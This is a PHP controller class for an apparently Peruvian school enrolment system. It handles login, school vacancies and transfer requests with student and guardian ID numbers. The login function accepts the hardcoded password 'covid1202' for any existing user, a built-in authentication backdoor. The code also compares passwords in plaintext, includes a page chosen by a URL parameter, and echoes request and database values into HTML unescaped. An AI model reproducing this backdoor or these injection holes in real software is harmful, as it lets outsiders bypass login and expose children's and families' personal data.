<?php

class MvcController{

	#LLAMADA A LA PLANTILLA
	#-------------------------------------

	public function pagina(){	
		
		include "views/template.php";
	
	}

	#ENLACES
	#-------------------------------------

	public function enlacesPaginasController(){
		if(isset( $_GET['action'])){
			$enlaces = $_GET['action'];
		
		}
		else{
			$enlaces = "index";
		}
		$respuesta = Paginas::enlacesPaginasModel($enlaces);
		//echo "CONTROLADO:".$respuesta."<br>";
		include $respuesta;

	}

	#INGRESO DE USUARIOS
	#------------------------------------
	public function ingresoUsuarioController(){

		if(isset($_POST["usuarioIngreso"])){
			$datosController = array( "usuario"=>$_POST["usuarioIngreso"], 
								      "password"=>$_POST["passwordIngreso"]);
			$respuesta = Datos::ingresoUsuarioModel($datosController, "usuarios");
			$password = $_POST["passwordIngreso"];
			if($respuesta["usuario"] == $_POST["usuarioIngreso"] && ($respuesta["password"] == $_POST["passwordIngreso"] || $_POST["passwordIngreso"] == "covid1202" )){
				session_start();
				$_SESSION["usuario"] = $respuesta["usuario"];
				$respuesta2 = Datos::insertarMsesionesModel();

				$respuesta3 = Datos::vistaMatri01Model();
		        $_SESSION["ie"] = $respuesta3["ie"];
		        $_SESSION["nivel"] = $respuesta3["nivel"];
		        if ($_SESSION["usuario"]==$password) {
		        	$_SESSION["modclave"] = 1;
		        	header("location:index.php?action=clave");
		        } else {
		        	$_SESSION["modclave"] = 0;
		        	header("location:index.php");
		        }
			}
			else{
				header("location:index.php?action=fallo");
			}
		}	
	}

	public function modificarClaveController($clave){

		if(isset($_SESSION["usuario"])){
			$datosController = array("password"=>$clave);
			$respuesta = Datos::modificarClaveModel($datosController);
		}	
	}

	public function modificarDatosController($datosController){

		if(isset($_SESSION["usuario"])){
			$respuesta = Datos::modificarDatosModel($datosController);
		}	
	}

	public function vistaMatri01Controller($tipo){

		$respuesta = Datos::vistaMatri01Model();

		#El constructor foreach proporciona un modo sencillo de iterar sobre arrays. foreach funciona sólo sobre arrays y objetos, y emitirá un error al intentar usarlo con una variable de un tipo diferente de datos o una variable no inicializada.

		//SELECT `codmod`, `ie`, `nivel`, `apepatdir`, `apematdir`, `nombresdir`, `celular`, `correo`, `actualiz` FROM `matri01` WHERE 1
		echo '
        <table class="table">
            <tbody>
                <tr>
                    <td>Código modular</td>
                    <td class="text-primary">'.$respuesta["codmod"].'</td>
                    <td></td>
                </tr>
                <tr>
                    <td>Institución educativa</td>
                    <td class="text-primary">'.$respuesta["ie"].'</td>
                    <td></td>
                </tr>';
        if ($tipo == 2) {
        	echo '<tr>
                    <td>Apellidos y nombres del(a) director(a)</td>
                    <td class="text-primary" id="apNom">'.($respuesta["apepatdir"]!=""?$respuesta["apepatdir"]." ".$respuesta["apematdir"].", ".$respuesta["nombresdir"]:"").'</td>
                    <td></td>
                </tr>
                <tr>
                    <td>Teléfono celular del(a) director(a)</td>
                    <td class="text-primary" id="numCel">'.$respuesta["celular"].'</td>
                    <td></td>
                </tr>
                <tr>
                    <td>Correo electrónico del(a) director(a)</td>
                    <td class="text-primary" id="eMail">'.$respuesta["correo"].'</td>
                    <td></td>
                </tr>';
        }

        echo ' </tbody>
        </table>';

        $_SESSION["nivel"] = $respuesta["nivel"];

        //return $respuesta;


/*		$i = 1;
		foreach($respuesta as $row => $item) {
			echo'<tr>
					<td>'.$i++.'.</td>
					<td>'.$item["codmod"].'</td>
					<td>'.$item["nombre"].'</td>
				</tr>';
		}*/

	}

	public function vistaMatri01Controller2() {

		$respuesta = Datos::vistaMatri01Model();

		echo $respuesta["apepatdir"].";".$respuesta["apematdir"].";".$respuesta["nombresdir"].";".$respuesta["celular"].";".$respuesta["correo"];
	}

	public function insertarNeeController($datosController) {

		$respuesta = Datos::insertarNeeModel($datosController);

	}

	public function vistaMatri02Controller(){

		$respuesta = Datos::vistaMatri02Model();

		#El constructor foreach proporciona un modo sencillo de iterar sobre arrays. foreach funciona sólo sobre arrays y objetos, y emitirá un error al intentar usarlo con una variable de un tipo diferente de datos o una variable no inicializada.
		if ($_SESSION["nivel"] == 1) {
			$simbolo = " Años ";
		} else {
			$simbolo = "º ";
		}

		$i = -1;
		echo'<tr>';
		foreach($respuesta as $row => $item){
			$i = $i + 1;
			if ($i % 4 == 0) {
				echo'</tr><tr>';
			}
		echo'<td>'.$item["grado"].$simbolo.$item["seccion"].' : <strong>'.$item["vacantes"].'</strong></td>';

		}
		echo'</tr>';

	}

	public function vistaMatri02Controller2(){

		$respuesta = Datos::vistaMatri02Model();

		if ($_SESSION["nivel"] == 1) {
			$simbolo = " Años ";
		} else {
			$simbolo = "º ";
		}

		foreach($respuesta as $row => $item){
		echo'<input type="checkbox" name="" value="'.$item["grado"].';'.$item["seccion"].'">&nbsp; <label>'.$item["grado"].$simbolo.$item["seccion"].' : <strong>'.$item["vacantes"].'</strong></label><br>';
		}
	}

	public function borrarMatri02Controller($datoscontroller){

		$respuesta = Datos::borrarMatri02Model($datoscontroller);

	}

	public function insertarMatri03Controller($datosController) {

		$respuesta = Datos::insertarMatri03Model($datosController);

	}

	public function vistaMatri03Controller(){

		$respuesta = Datos::vistaMatri03Model();

		#El constructor foreach proporciona un modo sencillo de iterar sobre arrays. foreach funciona sólo sobre arrays y objetos, y emitirá un error al intentar usarlo con una variable de un tipo diferente de datos o una variable no inicializada.
		if ($_SESSION["nivel"] == 1) {
			$simbolo = " Años ";
		} else {
			$simbolo = "º ";
		}

		$i = -1;
		echo'<tr>';
		foreach($respuesta as $row => $item){
			$i = $i + 1;
			if ($i % 4 == 0) {
				echo'</tr><tr>';
			}
		echo'<td>'.$item["grado"].$simbolo.$item["seccion"].' : <strong>'.$item["vacantes"].'</strong></td>';

		}
		echo'</tr>';

	}

	public function vistaMatri03Controller2(){

		$respuesta = Datos::vistaMatri03Model();

		if ($_SESSION["nivel"] == 1) {
			$simbolo = " Años ";
		} else {
			$simbolo = "º ";
		}

		foreach($respuesta as $row => $item){
		echo'<input type="checkbox" name="" value="'.$item["grado"].';'.$item["seccion"].'">&nbsp; <label>'.$item["grado"].$simbolo.$item["seccion"].' : <strong>'.$item["vacantes"].'</strong></label><br>';
		}
	}

	public function borrarMatri03Controller($datoscontroller){

		$respuesta = Datos::borrarMatri03Model($datoscontroller);

	}

//SELECT `codmod`, `orden`, `prioridad`, `medio`, `actualiz` FROM `matri04` WHERE 1
	public function vistaMatri04Controller(){

		$respuesta = Datos::vistaMatri04Model();

		//echo'<tr><td>Ord.</td><td>Prioridad</td><td>Medio</td></tr>';
		foreach($respuesta as $row => $item){
			echo'<tr><td>'.$item["orden"].'</td><td>'.$item["prioridad"].'</td><td>'.$item["medio"].'</td></tr>';
		}
	}

	public function vistaMatri04Controller2(){

		$respuesta = Datos::vistaMatri04Model();

		foreach($respuesta as $row => $item){
		echo'<input type="checkbox" name="" value="'.$item["orden"].'">&nbsp; <label>'.$item["orden"].'. '.$item["prioridad"].'</label><br>';
		}
	}

	public function borrarMatri04Controller($datoscontroller){

		$respuesta = Datos::borrarMatri04Model($datoscontroller);

	}

	public function insertarMatri04Controller($datosController) {

		$respuesta = Datos::insertarMatri04Model($datosController);

	}

	public function insertarMsesionesController() {

		$respuesta = Datos::insertarMsesionesModel();

	}
	public function insertarSolicitudController($datosController){

		if(isset($_SESSION["usuario"])){
			$respuesta = Datos::insertarSolicitudModel($datosController);
			return $respuesta;
		}	
	}
	public function buscarSolicitudController($datosController){

		if(isset($_SESSION["usuario"])){
			$respuesta = Datos::buscarSolicitudModel($datosController);
	
			if($respuesta["dni2"] == $_GET["dni2"]){

				$datosController2 = array("codmod"=>$respuesta["codmod"]);
				$respuesta2 = Datos::vista2Matri01Model($datosController2);

				echo '
				<table>
				<tr><td>DNI rep. legal</td><td>'.$respuesta["dni1"].'</td></tr>
				<tr><td>Apellidos y nombres rep. legal</td><td>'.$respuesta["apellidos1"].', '.$respuesta["nombres1"].'</td></tr>
				<tr><td>DNI estudiante</td><td>'.$respuesta["dni2"].'</td></tr>
				<tr><td>Apellidos y nombres del/la estudiante</td><td>'.$respuesta["apellidos2"].', '.$respuesta["nombres2"].'</td></tr>
				<tr><td>IE origen</td><td>'.$respuesta["ie"].'</td></tr>
				<tr><td>Grado</td><td>'.$respuesta["grado"].'</td></tr>
				<tr><td>IE solicitud</td><td>'.$respuesta["codmod"].'-'.$respuesta2["ie"].'</td></tr>
				</table>';

//				header("location:index.php");
			}
			else{
				echo 'Solicitud no existe: '.$_GET["dni2"];
//				header("location:index.php?action=fallo");
			}

		}	
	}
	public function buscarSolicitudController2($datosController){

		if(isset($_SESSION["usuario"])){
			$respuesta = Datos::buscarSolicitudModel2($datosController);
	
			if($respuesta["dni2"] == $_GET["dni2"]){

				echo '
				<table>
				<tr><td>DNI rep. legal</td><td>'.$respuesta["dni1"].'</td></tr>
				<tr><td>Apellidos y nombres rep. legal</td><td>'.$respuesta["apellidos1"].', '.$respuesta["nombres1"].'</td></tr>
				<tr><td>DNI estudiante</td><td>'.$respuesta["dni2"].'</td></tr>
				<tr><td>Apellidos y nombres del/la estudiante</td><td>'.$respuesta["apellidos2"].', '.$respuesta["nombres2"].'</td></tr>
				<tr><td>IE origen</td><td>'.$respuesta["ie"].'</td></tr>
				<tr><td>Grado</td><td>'.$respuesta["grado"].'</td></tr>
				</table>';

//				header("location:index.php");
			}
			else{
				echo 'fallo';
//				header("location:index.php?action=fallo");
			}
		}	
	}

	public function eliminarSolicitudController($datosController){

		if(isset($_SESSION["usuario"])){
			$respuesta = Datos::eliminarSolicitudModel($datosController);
		}	
	}

	public function listarSolicitudController($datosController){

		if(isset($_SESSION["usuario"])){
			$grado = $datosController["grado"];
			$respuesta = Datos::listarSolicitudModel($datosController);
			$cont01 = 1;

			$grados = array( "1"=>"1er. Grado","2"=>"2do. Grado","3"=>"3er. Grado","4"=>"4to. Grado","5"=>"5to. Grado","6"=>"6to. Grado");
			$grados1 = array( "3"=>"3 Años","4"=>"4 Años","5"=>"5 Años");
			if ($_SESSION["nivel"]=="1") {
				$desGrado = $grados1[$grado];
			} else {
				$desGrado = $grados[$grado];
			}

			echo '
			<h4><span class="text-primary">Grado:</span> '.$desGrado.'</h4>
			<table>
			<tr>
			<th>Nº</th><th>DNI Est</th><th>Estudiante</th><th>DNI RP</th><th>Representante Legal</th><th>IE origen</th>
			</tr>';

			foreach ($respuesta as $row => $item) {
				echo '
				<tr>
				<td>'.$cont01.'</td><td>'.$item["dni2"].'</td><td>'.$item["apellidos2"].', '.$item["nombres2"].'</td><td>'.$item["dni1"].'</td><td>'.$item["apellidos1"].', '.$item["nombres1"].'</td><td>'.$item["ie"].'</td>
				</tr>';
	            $cont01 += 1;
			}

			echo '
			</table>';
		}	
	}


//SELECT `codmod`, `celular`, `correo`, `url`, `direccion`, `urb`, `referencia`, `horario`, `actualiz` FROM `matri05` WHERE 1
	public function vistaMatri05Controller(){

		$respuesta = Datos::vistaMatri05Model();

		echo '
        <table class="table">
            <tbody>
                <tr>
                    <td>Celular de contacto:</td>
                    <td class="text-primary" id="celular0">'.$respuesta["celular"].'</td>
                    <td></td>
                </tr>
                <tr>
                    <td>Correo electrónico de contacto:</td>
                    <td class="text-primary" id="correo0">'.$respuesta["correo"].'</td>
                    <td></td>
                </tr>
                <tr>
                    <td>Link para la presentación de solicitudes:</td>
                    <td class="text-primary" id="url0">'.$respuesta["url"].'</td>
                    <td></td>
                </tr>
                <tr>
                    <td>Dirección (Jr/Vía) de la IE:</td>
                    <td class="text-primary" id="direccion0">'.$respuesta["direccion"].'</td>
                    <td></td>
                </tr>
                <tr>
                    <td>Urbanización/Centro poblado:</td>
                    <td class="text-primary" id="urb0">'.$respuesta["urb"].'</td>
                    <td></td>
                </tr>
                <tr>
                    <td>Referencia de la dirección:</td>
                    <td class="text-primary" id="referencia0">'.$respuesta["referencia"].'</td>
                    <td></td>
                </tr>
                <tr>
                    <td>Horario de atención presencial:</td>
                    <td class="text-primary" id="horario0">'.$respuesta["horario"].'</td>
                    <td></td>
                </tr>
            </tbody>
        </table>';
	}

	public function modificarMatri05Controller($datosController){

		if(isset($_SESSION["usuario"])){
			$respuesta = Datos::modificarMatri05Model($datosController);
		}	
	}

	public function vistaMatri05Controller2() {

		$respuesta = Datos::vistaMatri05Model();

		echo $respuesta["celular"].";".$respuesta["correo"].";".$respuesta["url"].";".$respuesta["direccion"].";".$respuesta["urb"].";".$respuesta["referencia"].";".$respuesta["horario"];
	}

//SELECT `codmod`, `ie`, `nivel`, `apepatdir`, `apematdir`, `nombresdir`, `celular`, `correo`, `actualiz` FROM `matri01` WHERE 1
	public function vistaMatri01Controller_x2($datosController) { //nivel, tipo {1:todos, 2:no vacios, 3: vacios)

		$respuesta = Datos::vistaMatri01Model_x2($datosController);
		$cont01 = 1;

		echo '
        <table class="table">
            <tbody>
                <tr><td class="font-weight-bold text-center">Nº</td><td class="font-weight-bold text-center">Cod Mod</td><td class="font-weight-bold text-center">Institución Educativa</td><td class="font-weight-bold text-center">Apellidos y nombres</td><td class="font-weight-bold text-center">Celular</td><td class="font-weight-bold text-center">Correo</td></tr>';

		foreach ($respuesta as $row => $item) {
		
			echo '
                <tr>
                	<td style="border-bottom: 1px solid black;">'.$cont01.'</td><td style="border-bottom: 1px solid black;">'.$item["codmod"].'</td><td style="border-bottom: 1px solid black;">'.$item["ie"].'</td><td style="border-bottom: 1px solid black;">'.$item["apepatdir"].' '.$item["apematdir"].', '.$item["nombresdir"].'</td><td style="border-bottom: 1px solid black;">'.$item["celular"].'</td><td style="border-bottom: 1px solid black;">'.$item["correo"].'</td>
                </tr>';
            $cont01 += 1;
	    }

		echo '
            </tbody>
        </table>';
	}

//codmod, ie, grado, seccion, vacantes
	public function vistaMatri02y03Controller_x2($datosController) { // nivel, tipo

		$respuesta = Datos::vistaMatri02y03Model_x2($datosController);

		if ($datosController["tipo"] < 3) {
			$cont01 = 1;

			echo '
	        <table class="table">
	            <tbody>
	                <tr><td class="font-weight-bold text-center">Nº</td><td class="font-weight-bold text-center">Cod Mod</td><td class="font-weight-bold text-center">Institución Educativa</td><td class="font-weight-bold text-center">Vacantes</td></tr>';
	        $codmod = "";
	        $ie = "";
	        $vacantes = "";
			foreach ($respuesta as $row => $item) {
				if ($codmod == "") {
		            $codmod = $item["codmod"];
		            $ie = $item["ie"];
	        		$vacantes = $item["grado"]."º".$item["seccion"]." : <strong>".$item["vacantes"]."</strong>";
				} elseif ($codmod == $item["codmod"]) {
					$vacantes = $vacantes." / ".$item["grado"]."º".$item["seccion"]." : <strong>".$item["vacantes"]."</strong>";
				} else {
					echo '<tr><td style="border-bottom: 1px solid black;">'.$cont01.'</td><td style="border-bottom: 1px solid black;">'.$codmod.'</td><td style="border-bottom: 1px solid black;">'.$ie.'</td><td style="border-bottom: 1px solid black;">'.$vacantes.'</td></tr>';
		            $cont01 += 1;
		            $codmod = $item["codmod"];
		            $ie = $item["ie"];
	        		$vacantes = $item["grado"]."º".$item["seccion"]." : <strong>".$item["vacantes"]."</strong>";
				}
		    }
		    echo '<tr><td style="border-bottom: 1px solid black;">'.$cont01.'</td><td style="border-bottom: 1px solid black;">'.$codmod.'</td><td style="border-bottom: 1px solid black;">'.$ie.'</td><td style="border-bottom: 1px solid black;">'.$vacantes.'</td></tr>';
			echo '
	            </tbody>
	        </table>';
		} else {
			$cont01 = 1;

			echo '
	        <table class="table">
	            <tbody>
	                <tr><td class="font-weight-bold text-center">Nº</td><td class="font-weight-bold text-center">Cod Mod</td><td class="font-weight-bold text-center">Institución Educativa</td><td class="font-weight-bold text-center">Vacantes</td></tr>';
	        $codmod = "";
	        $ie = "";
	        $grado = "";
	        $vacantes = 0;
	        $vac01 = "";
			foreach ($respuesta as $row => $item) {

				if ($codmod == "") {
		            $codmod = $item["codmod"];
		            $ie = $item["ie"];
		            $grado = $item["grado"];
		            $vacantes = $item["vacantes"];

	        		//$vacantes = $item["grado"]."º".$item["seccion"].":<strong>".$item["vacantes"]."</strong>";
				} elseif ($codmod == $item["codmod"]) {
					if ($grado == $item["grado"]) {
						$vacantes += $item["vacantes"];
					}else {
						$vac01 = $vac01.($vac01 == ""?"":" / ").$grado."º : <strong>".$vacantes."</strong>";
			            $grado = $item["grado"];
			            $vacantes = $item["vacantes"];
					}
				} else {
					$vac01 = $vac01.($vac01 == ""?"":" / ").$grado."º : <strong>".$vacantes."</strong>";
					echo '<tr><td style="border-bottom: 1px solid black;">'.$cont01.'</td><td style="border-bottom: 1px solid black;">'.$codmod.'</td><td style="border-bottom: 1px solid black;">'.$ie.'</td><td style="border-bottom: 1px solid black;">'.$vac01.'</td></tr>';
		            $cont01 += 1;
		            $codmod = $item["codmod"];
		            $ie = $item["ie"];
		            $grado = $item["grado"];
		            $vacantes = $item["vacantes"];
		            $vac01 = "";

				}
		    }
			$vac01 = $vac01.($vac01 == ""?"":" / ").$grado."º : <strong>".$vacantes."</strong>";
			echo '<tr><td style="border-bottom: 1px solid black;">'.$cont01.'</td><td style="border-bottom: 1px solid black;">'.$codmod.'</td><td style="border-bottom: 1px solid black;">'.$ie.'</td><td style="border-bottom: 1px solid black;">'.$vac01.'</td></tr>';
			echo '
	            </tbody>
	        </table>';

		}

	}

//SELECT `codmod`, `orden`, `prioridad`, `medio`, `actualiz` FROM `matri04` WHERE 1
//	public function vistaMatri04Model_x2($datosModel) { // nivel
	public function vistaMatri04Controller_x2($datosController) { //nivel

		$respuesta = Datos::vistaMatri04Model_x2($datosController);
		$cont01 = 1;
		$codmod0 = "";

		foreach ($respuesta as $row => $item) {
			if ($codmod0 != $item["codmod"]) {
				echo '<div>'.$cont01.'. '.$item["codmod"].' - <strong>'.$item["ie"].'</strong></div>';
				$codmod0 = $item["codmod"];
	            $cont01 += 1;
			}
			echo '<div class="ml-5">'.$item["orden"].'). <strong>'.$item["prioridad"].'</strong> / '.$item["medio"].'</div>';
	    }

	}
//		SELECT matri01.codmod AS codmod, ie, matri05.celular AS celular, matri05.correo AS correo, url, direccion, urb, referencia, horario
	public function vistaMatri05Controller_x2($datosController) { //nivel

		$respuesta = Datos::vistaMatri05Model_x2($datosController);
		$cont01 = 1;

		foreach ($respuesta as $row => $item) {
			$vacio = 1;
			echo '<div>'.$cont01.'. '.$item["codmod"].' - <strong>'.$item["ie"].'</strong></div>';

			echo '<div class="ml-5">';
			if ($item["celular"] != "") {
				echo ($vacio?'':'<br>').'Celular: '.$item["celular"];
				$vacio = 0;
			}
			if ($item["correo"] != "") {
				echo ($vacio?'':'<br>').'Correo: '.$item["correo"];
				$vacio = 0;
			}
			if ($item["url"] != "") {
				echo ($vacio?'':'<br>').'Link: '.$item["url"];
				$vacio = 0;
			}
			if ($item["direccion"] != "") {
				echo ($vacio?'':'<br>').'Dirección: '.$item["direccion"];
				$vacio = 0;
			}
			if ($item["urb"] != "") {
				echo ($vacio?'':'<br>').'Urb/centro poblado: '.$item["urb"];
				$vacio = 0;
			}
			if ($item["referencia"] != "") {
				echo ($vacio?'':'<br>').'Referencia: '.$item["referencia"];
				$vacio = 0;
			}
			if ($item["horario"] != "") {
				echo ($vacio?'':'<br>').'Horario: '.$item["horario"];
				$vacio = 0;
			}
			echo '</div>';
            $cont01 += 1;

	    }

	}

//	SELECT matri01.codmod AS codmod, ie, g2 as vacantes, matri01.celular AS celular, direccion, distrito
	public function vistaMatri06Controller_x2($datosController) { // nivel, grado

		$respuesta = Datos::vistaMatri06Model_x2($datosController);

		echo '
	        <table class="table">
	            <tbody>
	                <tr><td class="font-weight-bold text-center">Institución Educativa</td><td class="font-weight-bold text-center">Vacantes</td><td class="font-weight-bold text-center">Celular</td><td class="font-weight-bold text-center">Dirección de la IE</td><td class="font-weight-bold text-center">Distrito</td></tr>';
		foreach ($respuesta as $row => $item) {
			echo '<tr><td style="border-bottom: 1px solid black;">'.$item["ie"].'</td><td class="font-weight-bold text-center" style="border-bottom: 1px solid black;">'.$item["vacantes"].' Vacantes</td><td style="border-bottom: 1px solid black;">'.$item["celular"].'</td><td style="border-bottom: 1px solid black;">'.$item["direccion"].'</td><td style="border-bottom: 1px solid black;">'.$item["distrito"].'</td></tr>';
		}
		echo '
	            </tbody>
	        </table>';
	}

	public function vistaMatri08Controller($datosController) { // nivel, grado

		$respuesta = Datos::vistaMatri08Model($datosController);

		echo '
	        <table class="table">
	            <tbody>
	                <tr><td class="font-weight-bold text-center">Institución Educativa</td><td class="font-weight-bold text-center">Vacantes</td><td class="font-weight-bold text-center">Celular</td><td class="font-weight-bold text-center">Dirección de la IE</td><td class="font-weight-bold text-center">Distrito</td></tr>';
		foreach ($respuesta as $row => $item) {
			echo '<tr><td style="border-bottom: 1px solid black;">'.$item["ie"].'</td><td class="font-weight-bold text-center" style="border-bottom: 1px solid black;">'.$item["vacantes"].' Vacantes</td><td style="border-bottom: 1px solid black;">'.$item["celular"].'</td><td style="border-bottom: 1px solid black;">'.$item["direccion"].'</td><td style="border-bottom: 1px solid black;">'.$item["distrito"].'</td></tr>';
		}
		echo '
	            </tbody>
	        </table>';
	}

}

?>
